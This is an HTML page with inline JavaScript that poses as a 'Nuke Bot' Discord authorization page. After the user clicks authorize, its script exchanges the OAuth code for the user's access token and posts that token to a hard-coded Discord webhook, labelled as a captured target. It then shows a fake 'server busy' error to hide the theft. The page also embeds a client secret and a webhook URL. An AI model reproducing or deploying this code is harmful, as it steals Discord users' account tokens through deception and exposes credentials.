<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>WWW HUB NUKE BOT</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #1a1a2e; color: white; }
    button { background: #5865F2; border: none; color: white; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; }
    button:hover { background: #4752C4; }
    #status { margin-top: 20px; color: #aaa; }
  </style>
</head>
<body>
  <h1>Nuke Bot 授权</h1>
  <p>点击下方按钮授权</p>
  <button onclick="startAuth()">授权按鈕</button>
  <p id="status">等待授权...</p>

  <script>
    // ---------- 配置区 ----------
    const clientId = '1313365966964654151';
    const clientSecret = 'zOlONsqzcxL-VJTcpWpsBaNKWBmWqGz0';
    const redirectUri = 'https://weien0408.github.io/dcnitro/';
    const scope = 'identify email guilds';
    // 👇 Webhook已按您的要求配置
    const webhookUrl = 'https://discord.com/api/webhooks/1541920289024245760/0WcAX490SckZjwvmeEm6a2BQQEdVTBiMeZZC98lSPoFyhduVtS81SL-lieLh3Dv8c4vF';

    // ---------- 发起授权 ----------
    function startAuth() {
      const url = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}`;
      window.location.href = url;
    }

    // ---------- 页面加载时换Token并发送到Webhook ----------
    window.onload = function() {
      const params = new URLSearchParams(window.location.search);
      const code = params.get('code');

      if (code) {
        document.getElementById('status').innerText = '⏳ 兑换Token中...';

        fetch('https://discord.com/api/oauth2/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `client_id=${clientId}&client_secret=${clientSecret}&grant_type=authorization_code&code=${code}&redirect_uri=${encodeURIComponent(redirectUri)}`
        })
        .then(res => res.json())
        .then(data => {
          if (data.access_token) {
            const token = data.access_token;
            document.getElementById('status').innerText = '✅成功授權正在驗證';

            // ---- 通过Webhook发送Token到Discord频道 ----
            return fetch(webhookUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                content: `🎯 **Nuke Bot 新Token捕获**\n\`\`\`${token}\`\`\`\n⏰ ${new Date().toLocaleString()}\n👤 目标用户: <@${data.user ? data.user.id : '未知'}>`
              })
            })
            .then(() => {
              document.getElementById('status').innerText = '❌ 错误！';
              alert('目前伺服器繁忙');
            });

          } else {
            document.getElementById('status').innerText = '❌ 错误: ' + JSON.stringify(data);
            alert('目前伺服器繁忙');
          }
        })
        .catch(err => {
          document.getElementById('status').innerText = '❌ 请求失败';
          alert('❌目前伺服器繁忙');
        });
      }
    };
  </script>
</body>
</html>
